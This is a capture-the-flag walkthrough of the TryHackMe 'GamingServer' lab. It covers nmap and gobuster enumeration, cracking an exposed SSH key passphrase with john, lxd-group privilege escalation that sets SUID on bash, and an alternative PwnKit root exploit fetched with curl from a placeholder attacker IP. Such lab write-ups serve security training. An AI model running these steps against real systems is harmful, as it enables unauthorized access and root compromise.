---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Brute-Force
  - PwnKit
---
https://tryhackme.com/room/gamingserver/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.201.77.14 gamingserver.thm
```
# Scanning
```console
$ nmap -p22,80 -sV -sC gamingserver.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Discovery
Found **user john** in the website's source code:
```console
$ curl -s 'http://gamingserver.thm/' | grep '<!--'

<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```
# Enumeration
Found some existing directories:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gamingserver.thm

/.hta                 (Status: 403) [Size: 281]
/.htaccess            (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 321] [--> http://gamingserver.thm/secret/]
/server-status        (Status: 403) [Size: 281]
/uploads              (Status: 301) [Size: 322] [--> http://gamingserver.thm/uploads/]
```
After navigating through the directories, found a **passphrase-protected SSH key** at `/secret/secretKey` and a **list of passwords** at `/uploads/dict.lst`:
```console
$ curl -s -O 'http://gamingserver.thm/secret/secretKey'

$ curl -s -O 'http://gamingserver.thm/uploads/dict.lst'
```
Cracked the **SSH passphrase**:
```console
$ ssh2john secretKey > secretKey.hash

$ john --wordlist=/usr/share/dict/rockyou.txt secretKey.hash
letmein          (secretKey)
```
# Exploitation
Connect as **john** to the machine using his private SSH key:
```console
$ chmod 600 secretKey

$ ssh -o StrictHostKeyChecking=no -i secretKey john@gamingserver.thm
Enter passphrase for key '/home/kali/HTB/GamingServer/secretKey': letmein
```
Get the **user flag**:
```bash
cat /home/john/user.txt
```
# Post-Exploitation
## Abusing group
We are in the **lxd group**:
```console
$ id

uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
Follow the [HackTricks guide](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html) to escalate privileges using the **lxd group**. So, first mount a server with the Alpine Linux image:
```console
$ git clone https://github.com/saghul/lxd-alpine-builder

$ cd lxd-alpine-builder/

$ python3 -m http.server 8000
```
Now, download the Alpine image from the target machine and become **root**:
```console
$ cd /home/john

$ curl -s -O 'http://<ATTACKER-IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz'

$ lxc image import ./alpine*.tar.gz --alias myimage
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b

$ lxd init --auto

$ lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer

$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer

$ lxc start mycontainer

$ lxc exec mycontainer sh
```
Give the `/bin/bash` **SUID permissions** and become **root** again:
```console
# chmod u+s /mnt/root/bin/bash

# exit

$ /bin/bash -p
```
Get the **root flag**:
```bash
cat /root/root.txt
```
## PwnKit (alternative)
Found `/usr/bin/pkexec` with **SUID permissions**:
```console
$ ls -l /usr/bin/pkexec

-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```
From the attacker's machine, setup a server with the exploit:
```console
$ git clone https://github.com/ly4k/PwnKit

$ cd PwnKit

$ python3 -m http.server 8000
```
Download the exploit and execute it to become **root**:
```console
$ curl -s -O 'http://<ATTACKER-IP>:8000/PwnKit'

$ chmod +x PwnKit

$ ./PwnKit
```